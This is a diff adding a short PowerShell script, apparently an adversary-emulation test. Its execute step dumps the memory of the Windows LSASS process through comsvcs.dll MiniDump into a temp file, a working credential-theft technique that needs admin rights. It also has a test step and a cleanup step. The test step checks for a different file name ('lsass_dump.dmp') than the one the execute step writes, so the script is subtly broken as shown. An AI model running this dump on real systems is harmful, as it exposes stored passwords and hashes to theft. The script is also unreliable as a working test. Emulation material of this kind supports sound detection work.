@@ -1,0 +1,15 @@
+# Dump LSASS.exe memory using comsvcs.dll
+
+# Platform=windows
+# Execution=powershell
+# AdminRequired=yes
+# Invasive=yes, will seize processes
+
+# Execute 
+C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\lsass-comsvcs.dmp full
+
+# Test
+if (test-path C:\windows\temp\lsass_dump.dmp) { exit 0 } else { exit 1 }
+
+# Cleanup
+Remove-Item C:\windows\temp\lsass-comsvcs.dmp -ErrorAction Ignore
